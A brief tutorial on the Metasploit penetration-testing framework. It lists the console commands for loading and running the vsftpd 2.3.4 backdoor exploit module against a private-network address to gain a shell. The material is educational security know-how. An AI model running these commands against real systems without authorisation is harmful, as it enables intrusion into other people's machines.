What is Metasploit?

Metasploit is a powerful penetration testing framework used to develop and execute exploits against remote targets. It includes tools for information gathering, exploit development, payload creation, and post-exploitation.

Basic Usage

Start Metasploit:

msfconsole

Search for an exploit:

search vsftpd

Use an exploit module:

use exploit/unix/ftp/vsftpd_234_backdoor

Set options and run:

set RHOST 192.168.1.10
exploit

Practical Example

Exploit a vulnerable FTP server and gain shell access to perform further testing and enumeration on the target system.
